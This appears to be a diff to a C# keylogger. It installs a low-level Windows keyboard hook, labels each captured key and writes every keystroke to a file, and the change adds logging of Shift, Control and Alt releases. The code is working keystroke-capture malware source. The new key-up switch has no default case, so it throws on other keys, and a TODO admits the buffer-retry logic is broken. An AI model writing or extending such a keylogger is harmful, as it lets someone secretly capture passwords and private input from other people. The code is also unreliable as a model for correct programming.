@@ -39,13 +39,15 @@ public static class Program
         
         // checking for events other than keydown
         // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
-        if (code != 0 || (wParam != 0x0100 && wParam != 0x0104))
+        if (code != 0 || (wParam != 0x0100 && wParam != 0x0101 && wParam != 0x0104))
             return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
+
+        string stringToWrite = "";
 
         // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
         // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
         // their code
-        var stringToWrite = kbStruct->vkCode switch
+        if (wParam == 0x0100 || wParam == 0x0104) stringToWrite = kbStruct->vkCode switch
         {
             0x08 => " [BACKSPACE] ",
             0x09 => " [TAB] ",
@@ -190,7 +192,18 @@ public static class Program
             0xB7 => " [START APPLICATION 2] ",
             _ => $"[CODE {kbStruct->vkCode.ToString()}]"
         };
-
+                
+        // handle keyup events as it is important with shift, alt and control
+        if (wParam == 0x0101) stringToWrite = kbStruct->vkCode switch
+        {
+            0xA0 => " [LEFT SHIFT] ",
+            0xA1 => " [RIGHT SHIFT] ",
+            0xA2 => " [LEFT CONTROL] ",
+            0xA3 => " [RIGHT CONTROL] ",
+            0xA4 => " [LEFT ALT] ",
+            0xA5 => " [RIGHT ALT] "
+        };
+        
         WriteToFile(stringToWrite);
         
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
@@ -218,6 +231,9 @@ public static class Program
             }
             catch (InvalidOperationException)
             {
+                // TODO: this won't quite work
+                // need to copy the buffer, then write it but preferable keep the Thread.Sleep(), this way avoid losing
+                // the buffer/writing the same buffer twice
                 Thread.Sleep(1000);
                 await WriteBuffer();
                 await _writer.FlushAsync();
